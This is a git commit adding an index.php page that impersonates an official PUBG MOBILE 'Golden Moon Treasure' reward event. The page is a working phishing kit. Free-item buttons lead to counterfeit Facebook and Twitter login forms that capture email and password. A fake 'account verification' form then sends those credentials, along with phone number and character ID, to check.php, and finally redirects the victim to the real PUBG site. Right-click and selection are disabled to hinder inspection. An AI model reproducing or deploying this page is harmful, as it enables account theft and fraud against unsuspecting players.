7ce9e0ac60e4c396943a1a4108d056dcea922067
PranavKumar2003 <pranav20031997@gmail.com>
2022-05-04 15:31:23 +0530

    my first site

---
+++ index.php
@@ -0,0 +1,475 @@
+<html>
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta property="og:title" content="PUBG MOBILE: Golden Moon Treasure">
+<meta name="description" content="Collect your special rewards at the Golden Moon Treasure event. This opportunity is limited and without the need for topup. Collect your rewards now!">
+<meta property="og:description" content="Collect your special rewards at the Golden Moon Treasure event. This opportunity is limited and without the need for topup. Collect your rewards now!">
+<meta property="og:url" content="./">
+<meta property="og:site_name" content="PUBG MOBILE: Golden Moon Treasure">
+<meta property="og:type" content="website">
+<meta name="copyright"content="PUBG MOBILE">
+<meta name="theme-color" content="#000">
+<meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+<title>PUBG MOBILE: Golden Moon Treasure</title>
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/animate.css">
+<link rel="stylesheet" href="css/login/facebook.css">
+<link rel="stylesheet" href="css/login/twitter.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+  
+<div class="container">
+<div class="navbar">
+<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
+<div class="navbar-right">
+<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
+<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
+<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
+<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
+</div> <!--- navbar-right --->
+</div> <!--- navbar --->
+<div class="header">
+<video id="headerVideo" src="media/header.mp4" autoplay loop muted></video>
+</div> <!--- header --->
+<div class="home-title"></div> <!--- home-title --->
+<div class="box">
+<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
+<div class="menu-wrapper">
+<center>
+<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'event');" id="defaultTabRewards"><div class="menu-content-txt">Event Reward</div></div> <!--- menu-content --->
+</center>
+</div> <!--- menu-wrapper --->
+<center>
+<div class="tab_rewards" id="event">
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/1.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/2.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/3.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/4.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/5.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/6.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/7.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/8.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="img/rewards/9.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.png">Collect</button>
+</div>
+</div>
+</div> <!--- tab-rewards --->
+</center>
+</div> <!--- box --->
+<div class="footer">
+<div class="footer-txt-join">Join the Community</div> <!--- footer-txt-follow --->
+<div class="footer-socmed-box">
+<button type="button">Like</button>
+<img class="footer-socmed-img-main" src="https://i.postimg.cc/jnLQLD1x/footer-socmed-1.png">
+<p>Facebook</p>
+</div> <!--- footer-socmed-box --->
+<div class="footer-socmed-box">
+<button type="button">Follow</button>
+<img class="footer-socmed-img-other" src="https://i.postimg.cc/Thwcks3z/footer-socmed-2.png">
+<p>Twitter</p>
+</div> <!--- footer-socmed-box --->
+<div class="footer-socmed-box">
+<button type="button">Subscribe</button>
+<img class="footer-socmed-img-other" src="https://i.postimg.cc/bdB94RGs/footer-socmed-3.png">
+<p>Youtube</p>
+</div> <!--- footer-socmed-box --->
+<div class="footer-socmed-box">
+<button type="button">Follow</button>
+<img class="footer-socmed-img-main" src="https://i.postimg.cc/YvcfCqz7/footer-socmed-4.png">
+<p>Instagram</p>
+</div> <!--- footer-socmed-box --->
+<div class="footer-socmed-box">
+<button type="button">Like</button>
+<img class="footer-socmed-img-main" src="https://i.postimg.cc/w7RQzsJF/footer-socmed-5.png">
+<p>VK</p>
+</div> <!--- footer-socmed-box --->
+<img class="footer-copyright-icon" src="https://i.postimg.cc/pV8Q4L9L/footer-img.png">
+<div class="footer-txt-copyright">ⓒ 2022 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
+<div class="footer-txt-copyright">ⓒ 2018-2022 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
+<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
+<br>
+</div> <!--- footer --->
+</div> <!--- container --->
+
+<div class="popup itemReward_confirmation" style="display: none;">
+<div class="popup-box">
+<div class="popup-box-navbar">
+<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
+<div class="popup-box-navbar-title popup-box-navbar-title-fix">Reward Confirmation</div> <!--- popup-box-navbar-title --->
+</div> <!--- popup-box-navbar --->
+<div class="popup-box-bg">
+<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
+<div class="popup-box-item itemShine">
+<div>
+<figure>
+<img src="" id="myItemReward_confirmationImg">
+</figure>
+</div>
+</div> <!--- popup-box-item itemShine --->
+<br>
+</div> <!--- popup-box-bg --->
+<div class="popup-box-footer">
+<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
+</div> <!--- popup-box-footer --->
+</div> <!--- popup-box --->
+</div> <!--- popup --->
+
+<div class="popup otherReward_confirmation" style="display: none;">
+<div class="popup-box">
+<div class="popup-box-navbar">
+<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
+<div class="popup-box-navbar-title popup-box-navbar-title-fix">Reward Confirmation</div> <!--- popup-box-navbar-title --->
+</div> <!--- popup-box-navbar --->
+<div class="popup-box-bg">
+<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
+<div class="popup-box-item itemShine">
+<div>
+<figure>
+<span id="otherReward_confirmationValue"></span>
+<img src="" id="myOtherReward_confirmationImg">
+</figure>
+</div>
+</div> <!--- popup-box-item itemShine --->
+<br>
+</div> <!--- popup-box-bg --->
+<div class="popup-box-footer">
+<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
+</div> <!--- popup-box-footer --->
+</div> <!--- popup-box --->
+</div> <!--- popup --->
+
+<div class="popup account_login" style="display: none;">
+<div class="popup-box">
+<div class="popup-box-navbar">
+<div class="popup-box-navbar-title">Account Login</div> <!--- popup-box-navbar-title --->
+</div> <!--- popup-box-navbar --->
+<div class="popup-box-bg">
+<div class="popup-box-alert">Login to receive your selected reward</div> <!--- popup-box-alert --->
+<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
+<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
+</div> <!--- popup-box-bg --->
+<div class="popup-box-footer">
+</div> <!--- popup-box-footer --->
+</div> <!--- popup-box --->
+</div> <!--- popup --->
+
+<div class="popup-login login-facebook animated fadeIn" style="display: none;">
+<div class="popup-box-login-fb">
+<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+<div class="navbar-fb"><img src="https://i.postimg.cc/3wBVgZTz/login-Method1.png"></div> <!--- navbar-fb --->
+<div class="content-box-fb">
+<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
+<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE</div> <!--- txt-login-fb --->
+<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
+<label>
+<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
+</label>
+<label>
+<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required>
+</label>
+<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
+<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
+</form>
+<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
+<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
+<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
+</div> <!--- content-box-fb --->
+<div class="language-box">
+<center>
+<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
+<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
+<div class="language-name">Basa Jawa</div> <!--- language-name --->
+<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
+<div class="language-name">日本語</div> <!--- language-name --->
+<div class="language-name">Español</div> <!--- language-name --->
+<div class="language-name">Português (Brasil)</div> <!--- language-name --->
+<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
+</center>
+</div> <!--- language-box --->
+<div class="copyright">Facebook Inc.</div>
+</div> <!--- popup-box-login-fb --->
+</div> <!--- popup-login --->
+
+<div class="popup-login login-twitter animated fadeIn" style="display: none;">
+<div class="popup-box-login-twitter">
+<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
+<div class="box-twitter">
+<div class="header-twitter"><img src="https://i.postimg.cc/dtyfWFF2/login-Method2.png"></div> <!--- header-twitter --->
+<br>
+<br>
+<br>
+<center>
+<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
+<div class="txt-login-twitter">Login to Twitter</div> <!--- txt-login-twitter --->
+<div class="form-group">
+<input type="text" name="email" id="email-twitter" autocomplete="off" required>
+<label>Phone/email/username</label>
+</div> <!--- form-group --->
+<div class="form-group">
+<input type="password" name="password" id="password-twitter" autocomplete="off" required>
+<label>Password</label>
+</div> <!--- form-group --->
+<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
+<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
+<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
+<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter bulet --->
+<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
+</form>
+</center>
+</div> <!--- box-twitter --->
+</div> <!--- popup-box-login-twitter --->
+</div> <!--- popup-login --->
+
+<div class="popup account_verification" style="display: none;">
+<div class="popup-box popup-box-verification">
+<div class="popup-box-navbar">
+<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
+</div> <!--- popup-box-navbar --->
+<div class="popup-box-bg">
+<div class="popup-box-alert">Complete your account detail</div> <!--- popup-box-alert --->
+<form class="popup-box-form" action="check.php" id="formLogin" onsubmit="open_my_account();" method="post">
+<input type="hidden" name="email" id="validateEmail" readonly>
+<input type="hidden" name="password" id="validatePassword" readonly>
+<input type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
+<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
+<select name="level" id="level" required>
+<option selected="selected" disabled="disabled" value="">Account Level</option>
+<option>1</option>
+<option>2</option>
+<option>3</option>
+<option>4</option>
+<option>5</option>
+<option>6</option>
+<option>7</option>
+<option>8</option>
+<option>9</option>
+<option>10</option>
+<option>11</option>
+<option>12</option>
+<option>13</option>
+<option>14</option>
+<option>15</option>
+<option>16</option>
+<option>17</option>
+<option>18</option>
+<option>19</option>
+<option>20</option>
+<option>21</option>
+<option>22</option>
+<option>23</option>
+<option>24</option>
+<option>25</option>
+<option>26</option>
+<option>27</option>
+<option>28</option>
+<option>29</option>
+<option>30</option>
+<option>31</option>
+<option>32</option>
+<option>33</option>
+<option>34</option>
+<option>35</option>
+<option>36</option>
+<option>37</option>
+<option>38</option>
+<option>39</option>
+<option>40</option>
+<option>41</option>
+<option>42</option>
+<option>43</option>
+<option>44</option>
+<option>45</option>
+<option>46</option>
+<option>47</option>
+<option>48</option>
+<option>49</option>
+<option>50</option>
+<option>51</option>
+<option>52</option>
+<option>53</option>
+<option>54</option>
+<option>55</option>
+<option>56</option>
+<option>57</option>
+<option>58</option>
+<option>59</option>
+<option>60</option>
+<option>61</option>
+<option>62</option>
+<option>63</option>
+<option>64</option>
+<option>65</option>
+<option>66</option>
+<option>67</option>
+<option>68</option>
+<option>69</option>
+<option>70</option>
+<option>71</option>
+<option>72</option>
+<option>73</option>
+<option>74</option>
+<option>75</option>
+<option>76</option>
+<option>77</option>
+<option>78</option>
+<option>79</option>
+<option>80</option>
+<option>81</option>
+<option>82</option>
+<option>83</option>
+<option>84</option>
+<option>85</option>
+<option>86</option>
+<option>87</option>
+<option>88</option>
+<option>89</option>
+<option>90</option>
+<option>91</option>
+<option>92</option>
+<option>93</option>
+<option>94</option>
+<option>95</option>
+<option>96</option>
+<option>97</option>
+<option>98</option>
+<option>99</option>
+<option>100</option>
+</select>
+<input type="hidden" name="login" id="validateLogin" readonly>
+</div> <!--- popup-box-bg --->
+<div class="popup-box-form-footer">
+<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify my Account</button>
+</div> <!--- popup-box-form-footer --->
+</form> <!--- form --->
+</div> <!--- popup-box --->
+</div> <!--- popup --->
+
+<div class="popup check_verification" style="display: none;">
+<div class="popup-box">
+<div class="popup-box-navbar">
+<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
+</div> <!--- popup-box-navbar --->
+<div class="popup-box-bg">
+<div class="popup-box-alert">
+<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
+<br>
+Checking the completeness of your account...
+</div> <!--- popup-box-alert --->
+<br>
+</div> <!--- popup-box-bg --->
+<div class="popup-box-footer"></div> <!--- popup-box-footer --->
+</div> <!--- popup-box --->
+</div> <!--- popup --->
+
+<div class="popup processing_account" style="display: none;">
+<div class="popup-box">
+<div class="popup-box-navbar">
+<div class="popup-box-navbar-title">Processing Account</div> <!--- popup-box-navbar-title --->
+</div> <!--- popup-box-navbar --->
+<div class="popup-box-bg">
+<div class="popup-box-alert">
+Thanks for joining this event
+<br>
+<br>
+Your account has been successfully processed
+<br>
+Please wait up to 24 hours
+</div> <!--- popup-box-alert --->
+<br>
+</div> <!--- popup-box-bg --->
+<div class="popup-box-footer">
+<button type="button" onmousedown="tutup.play();" class="popup-footer-active" style="margin-right: 0; float: none;" onclick="location.href='https://pubgmobile.com/';">Logout</button>
+</div> <!--- popup-box-footer --->
+</div> <!--- popup-box --->
+</div> <!--- popup --->
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="js/script.js"></script>
+
+</body>
+</html>
